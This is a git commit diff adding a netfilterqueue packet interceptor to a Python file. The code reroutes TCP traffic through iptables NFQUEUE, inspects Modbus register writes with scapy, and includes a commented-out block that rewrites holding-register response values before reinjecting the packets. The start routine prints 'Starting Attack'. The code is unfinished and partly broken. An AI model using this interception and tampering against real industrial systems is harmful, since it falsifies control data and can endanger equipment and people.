18875ef32c5d0265c0120d1c408af282073b1a1f
tate-awesome <tate.abercrombie2017@gmail.com>
2025-12-18 17:26:25 -0700

    Figuring out netfilterqueue

--- Tate Files/GUI Game/network_interface2.py
+++ Tate Files/GUI Game/network_interface2.py
@@ -1,12 +1,10 @@
 import scapy.all as scapy 
 import threading
-from scapy.packet import Packet
-from scapy.fields import ShortField, ByteField, FieldListField
 from scapy.layers.inet import TCP
-from scapy.all import bind_layers
-from scapy.all import rdpcap
 from scapy.contrib.modbus import *
-import math
+import netfilterqueue as nfq
+from scapy.layers.inet import *
+import os
 
 class mb:
 
@@ -190,9 +188,81 @@ class mb:
     modbus_layer.payload
     '''
 
+class net_filter_queue:
+
+    def packet_listener(packet):
     
+    
+        pl=IP(packet.get_payload())
+
+        #print('source IP:',pl[IP].src)
+        #print('Destination IP', pl[IP].dst)
+        #print('raw:',bytes(pl))
+
+                    
+                        
+        
+        if  pl.haslayer("Write Single Register"): 
+            print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
+            print("Write register is:", pl['Write Single Register'])
+        
+        
+        '''
+        elif pl.haslayer("Read Holding Registers Response"):
+            print("Register response is:", pl['Read Holding Registers Response'].registerVal)
+            print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
+        #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
+            pload2=pl['Read Holding Registers Response'].registerVal
+        
+            pload2[0]=7
+            print('payload2 is ',pload2)
+        #pl['Write Single Register'].remove_payload
+            pl['Read Holding Registers Response'].registerVal=pload2
+            print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
+            del pl[TCP].chksum
+            del pl[IP].chksum
+            packet.set_payload(bytes(pl))
+            #packet.drop()
+            pl.show() 
+            
+        '''    
+        
+        #pl.show()  
+        scapy.send(pl)
+        packet.accept()
+            
+            
+                
+            
+
+        #print('plllllllllllllllllllllllll')
+
+        
+
+        #print(packet)
+        
+        #packet.accept()
+    def __setdown():
+        os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
+
+    def start():
+
+        os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+        os.system("sudo iptables -L")
+        queue = nfq()
+
+        queue.bind(1, net_filter_queue.packet_listener)
 
 
+
+        try:
+            print("Starting Attack")
+            
+            queue.run()
+        except KeyboardInterrupt:
+            net_filter_queue.__setdown()
+            print("stopping sniffing")
+            queue.unbind()
 
 class scapy_sniffing:
 
